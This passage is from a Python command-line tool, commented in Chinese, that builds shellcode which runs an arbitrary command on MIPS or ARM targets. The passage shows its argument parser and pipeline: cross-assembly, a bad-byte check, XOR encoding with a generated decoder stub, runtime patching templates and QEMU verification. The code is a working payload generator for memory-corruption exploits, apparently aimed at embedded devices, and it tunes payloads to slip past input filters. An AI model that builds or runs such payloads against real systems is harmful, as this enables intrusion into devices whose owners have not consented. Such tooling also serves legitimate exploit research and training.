    addu 	$t3,$t3,$t2
    sw      $t3,{number1}($sp)
"""
    asm_mips4 = """
    # 待开发
    .section .text
    .set noreorder
    .set noat
    .globl main
    main:
        addiu   $t4, $zero, {number1}
        subu    $t2, $sp, $t4
        lw    $t3, {number2}($sp)
        addu 	$t3,$t3,$t2
        addiu   $t2, $t2, 0x104
        sw      $t3,-0x104($t2)
    """
    # 确保输出目录存在
    try:
        asm_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_test_shellcode.s")
        obj_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_test_shellcode.o")
        bin_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_test_shellcode.bin")
        temp_asm = asm_mips3.format(number1=number1, number2=number2)
        with open(asm_file_path, "w") as f:
            f.write(temp_asm)

        subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}as", "-o", obj_file_path, asm_file_path], check=True)
        result = subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}objdump", "-d", obj_file_path], capture_output=True,
                                text=True, check=True)
        print(result.stdout.strip())
        print("------------------------------\n")
        subprocess.run(
            [f"{config['MIPS_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "--only-section=.text", obj_file_path,
             bin_file_path], check=True)
        with open(bin_file_path, "rb") as f:
            shellcode = f.read()
            print("编译成功! Shellcode 已生成到:", bin_file_path)
            # ---去除末尾的0x00---
            shellcode = shellcode.rstrip(b'\x00')
            if b'\x00' in shellcode:
                print_content = "\n⚠️ ---[ 坏字节检查: 失败! shellcode 中含有'\\x00'字节]---"
            else:
                print_content = "\n✅ ---[ 坏字节检查: 成功! Shellcode 中不含'\\x00'字节]---"
            print(print_content, "Shellcode (长度:", len(shellcode), "字节)")
            print_as_python_bytes(shellcode)

    except FileNotFoundError:
        print(
            f"[!] 错误: MIPS 交叉编译工具链未找到, 请检查 config['MIPS_TOOLCHAIN_PATH'] 的设置: '{config['MIPS_TOOLCHAIN_PATH']}'")
    except subprocess.CalledProcessError as e:
        print(f"[!] 编译失败: {e}")
        if hasattr(e, 'stderr') and e.stderr:
            print(f"错误详情: {e.stderr.decode('utf-8', 'ignore')}")
    except Exception as e:
        print(f"[!] 发生错误: {e}")
    finally:
        files_to_clean = [asm_file_path, obj_file_path, bin_file_path]
        for f in files_to_clean:
            if os.path.exists(f):
                os.remove(f)


def main():
    # --- 使用 argparse 解析命令行参数 ---
    parser = argparse.ArgumentParser(
        description="为一个命令生成 ARM 或 MIPS 架构的 shellcode。(arm只有小端能运行，大端有些问题。)",
        formatter_class=argparse.RawTextHelpFormatter  # 保持帮助文本格式
    )
    mips_group = parser.add_argument_group("MIPS 额外参数。")
    mips_group.add_argument("-short", "--short", action="store_true",
                            help="生成较短的 shellcode，处理过bad_bytes，使用自修复代码方式实现，未用xor编码方式。")
    mips_group.add_argument("-l", "--long_shellcode", action="store_true", help="生成较长的 shellcode。")
    mips_group.add_argument("-rp", "--Mips_Runtime_Patching", nargs=2,
                            help="运行时修补 / 内存修补 (Runtime Patching / In-Memory Patching)，当程序对shellcode某个字节有转换时可使用，如\\x3c转为\\x00导致shellcode无法执行。")
    mips_group.add_argument("-s", "--sleep", action="store_true", help="在shellcode前面加上睡眠指令,default 3 秒。")

    parser.add_argument("-arch", "--arch", choices=['arm', 'mips'], help="目标CPU架构 (arm 或 mips)。")
    parser.add_argument("-e", "--endian", choices=['big', 'little'], help="shellcode 字节序 (big 或 little)。")
    parser.add_argument("-cmd", "--cmd", help="要执行的命令。")
    parser.add_argument("-xor", "--xor_encode", action="store_true", help="对 shellcode 进行XOR编码。")
    parser.add_argument("-v", "--verify", action="store_true", help="编译运行验证 shellcode。")
    parser.add_argument("-sf", "--save_file", action="store_true", help="保存中间文件。")
    parser.add_argument("-b", "--bad_bytes", nargs="+",
                        help="坏字节列表 (十六进制),default: 0x00,0x3b,0x0a,0x0b,0x0c,0x0d,0x20,0x09")
    parser.add_argument("-fts", "--function_truncation_summary", action="store_true", help="显示函数截断汇总信息表。")
    args = parser.parse_args()

    # 打印函数截断汇总信息表
    if args.function_truncation_summary:
        summary = FunctionTruncationSummary()
        summary.print_summary()
        return

    if args.bad_bytes:
        print(f"[覆盖配置] 检测到自定义值: {args.bad_bytes}。覆盖 config['BAD_BYTES']。")
        config['BAD_BYTES'] = args.bad_bytes
    else:
        print("[使用配置] 未检测到自定义值，使用 config['BAD_BYTES'] 的默认值。")

    # 2. 从配置中获取最终要处理的原始坏字节列表
    raw_bad_bytes = config['BAD_BYTES']
    # 这行代码负责将各种格式 (如 "00,0a,ff", ["00,0a,ff"], ["00", "0a", "ff"]) 转换为整数列表
    args.bad_bytes = [
        int(b.strip(), 16) if isinstance(b, str) else b
        for b in (
            raw_bad_bytes[0].split(',')
            if isinstance(raw_bad_bytes, list) and len(raw_bad_bytes) == 1 and isinstance(raw_bad_bytes[0],
                                                                                          str) and ',' in raw_bad_bytes[
                   0]
            else (
                raw_bad_bytes.split(',')
                if isinstance(raw_bad_bytes, str)
                else raw_bad_bytes
            )
        )
    ]

    if not args.arch:
        print("请指定架构: -arch arm 或 -arch mips")
        return
    elif not args.cmd:
        print("请指定要执行的命令: -cmd 'echo hello world'")
        return
    elif not args.endian:
        print("请指定字节序: -endian big 或 -endian little")
        return
    if args.arch.lower() == "mips":
        if args.endian.lower() == "little":
            print(f"ℹ️  info: 架构：MIPS，字节序：小端（little-endian）， 命令：{args.cmd}")
            config[
                'MIPS_TOOLCHAIN_PATH'] = f"{current_user}/tools/mips32el--glibc--stable-2024.05-1/bin/mipsel-buildroot-linux-gnu-"
            config['QEMU_PATH'] = "qemu-mipsel"
        else:
            config[
                'MIPS_TOOLCHAIN_PATH'] = f"{current_user}/tools/mips32--glibc--stable-2024.05-1/bin/mips-buildroot-linux-gnu-"
            config['QEMU_PATH'] = "qemu-mips"
            print(f"ℹ️  info: 架构：MIPS，字节序：大端（big-endian）， 命令：{args.cmd}")
        # --- 1. 检查工具链 ---
        check_toolschain("MIPS_TOOLCHAIN_PATH", args.arch, args.endian)
        if args.cmd and args.short:
            Mips_Generate_short_shellcode(args.cmd, args.endian, args.save_file)
            return
        if args.Mips_Runtime_Patching:
            number1 = args.Mips_Runtime_Patching[0]
            number2 = args.Mips_Runtime_Patching[1]
            Mips_Runtime_Patching(number1, number2)
        # --- 2. 生成原始shellcode ---
        if args.cmd:
            print("===" * 30)
            # ---2.1 生成短shellcode---(汇编模板)
            if not args.long_shellcode:
                raw_shellcode = MipsShellcodeGenerator(args.cmd, args.save_file)
            # ---2.2 生成长shellcode---(C + 汇编模板)
            else:
                raw_shellcode = MipsShellcodeGenerator_long(args.cmd, args.arch, args.save_file)
            raw_shellcode_get = raw_shellcode.raw_shellcode
            print("✅ 生成原始 shellcode 成功 (长度: " + str(len(raw_shellcode_get)) + "字节)")
            print_as_python_bytes(raw_shellcode_get)
        # --- 3. 对 shellcode 进行 XOR 编码 ---
        if args.xor_encode:
            if args.sleep:
                sleep = Sleep()
                raw_shellcode_get = (sleep.Sleep_shellcode + raw_shellcode_get)
            else:
                raw_shellcode_get = raw_shellcode_get
            xor_encoder = XorEncoder(raw_shellcode_get, endian=args.endian, bad_bytes=args.bad_bytes)
            print("    -- xor编码后的shellcode (长度: " + str(len(xor_encoder.xor_encoded_shellcode)) + " 字节)")
            print_as_python_bytes(xor_encoder.xor_encoded_shellcode)
            key = xor_encoder.key
            loop_count = len(xor_encoder.xor_encoded_shellcode) // 4
            val_for_loop_count = -(loop_count + 1)

            # --- 4. 生成解码器 ---
            xor_decoder = XorDecoder(xor_encoder.xor_encoded_shellcode, key, args.save_file)
            print(
                f"✅  解码器生成成功，密钥: {hex(xor_decoder.key)}，循环次数: {loop_count}，循环次数值: {val_for_loop_count}, -- 解码器shellcode (长度 {str(len(xor_decoder.xor_decoded_shellcode))} 字节)")
            # --- 5. 打印解码器shellcode ---
            print_as_python_bytes(xor_decoder.xor_decoded_shellcode)
            # 调用方法生成解码器
            if xor_decoder and xor_encoder:
                merged_shellcode = xor_decoder.xor_decoded_shellcode + xor_encoder.xor_encoded_shellcode
                found, bad_bytes = check_bad_bytes(merged_shellcode)
                print(f"shellcode_data: 在解码器找到坏字节？{found}, 坏字节列表: {bad_bytes}")
                print(f"✅ xor解码器长度({str(len(xor_decoder.xor_decoded_shellcode))}字节) + xor编码后的shellcode长度({str(len(xor_encoder.xor_encoded_shellcode))}字节) = {str(len(merged_shellcode))} 字节")
                print_as_python_bytes(merged_shellcode)
        else:
            merged_shellcode = raw_shellcode_get
        if args.verify:
            # xor解码器+xor编码后的shellcode合并测试
            MipsVerifyShellcode(merged_shellcode)
    elif args.arch.lower() == "arm":
        if args.endian.lower() == "little":
            print(f"ℹ️  info: 架构：ARM，字节序：小端（little-endian）， 命令：{args.cmd}")
            config[
                'ARM_TOOLCHAIN_PATH'] = f"{current_user}/tools/armv7-eabihf--uclibc--stable-2024.05-1/bin/arm-buildroot-linux-uclibcgnueabihf-"
            config['ARM_PATH'] = "qemu-arm"
        else:
            print(f"ℹ️  info:架构：ARM，字节序：大端（big-endian）， 命令：{args.cmd}")
            config[
                'ARM_TOOLCHAIN_PATH'] = f"{current_user}/tools/armebv7-eabihf--uclibc--stable-2024.05-1/bin/armeb-buildroot-linux-uclibcgnueabihf-"
            config['ARM_PATH'] = "qemu-armeb"
        # --- 1. 检查工具链 ---
        check_toolschain("ARM_TOOLCHAIN_PATH", args.arch, args.endian)
        print("===" * 30)
        if args.cmd:
            # --- 2. 生成原始shellcode ---
            shellcode = ArmShellcodeGenerator(bad_bytes=args.bad_bytes, save_files=args.save_file)
            shellcode._generate_shellcode_from_asm(args.cmd)
            raw_shellcode_get = shellcode.raw_shellcode
            print("✅ 生成原始 shellcode 成功 (长度: " + str(len(raw_shellcode_get)) + "字节)")
            print_as_python_bytes(raw_shellcode_get)
        if args.cmd and args.xor_encode:
            # --- 3.  XOR 编码 ---
            shellcode.xorencoder()
            print("    -- xor编码后的shellcode (长度: " + str(len(shellcode.xor_encoded_shellcode)) + " 字节)")
            print_as_python_bytes(shellcode.xor_encoded_shellcode)
            # --- 4. 生成解码器 ---
            shellcode.xordecoder()
            print(f"✅  解码器生成成功，密钥: {hex(shellcode.key)}")
            print("    -- xor解码器shellcode (长度: " + str(len(shellcode.xor_decoder_shellcode)) + " 字节)")
            print_as_python_bytes(shellcode.xor_decoder_shellcode)
            merged_shellcode = shellcode.xor_decoder_shellcode + shellcode.xor_encoded_shellcode
            print(
                f"✅  xor解码器长度({str(len(shellcode.xor_decoder_shellcode))}字节) + xor编码后的shellcode长度({str(len(shellcode.xor_encoded_shellcode))}字节) = {str(len(merged_shellcode))} 字节")
            found, bad_bytes = check_bad_bytes(merged_shellcode)
            print(f"shellcode_data: 在解码器找到坏字节？{found}, 坏字节列表: {bad_bytes}")
            print_as_python_bytes(merged_shellcode)
        else:
            merged_shellcode = shellcode.raw_shellcode
        print("=" * 50)
        if args.verify:
            shellcode.verify_shellcode(merged_shellcode)
        print("-" * 60)


if __name__ == "__main__":
    main()
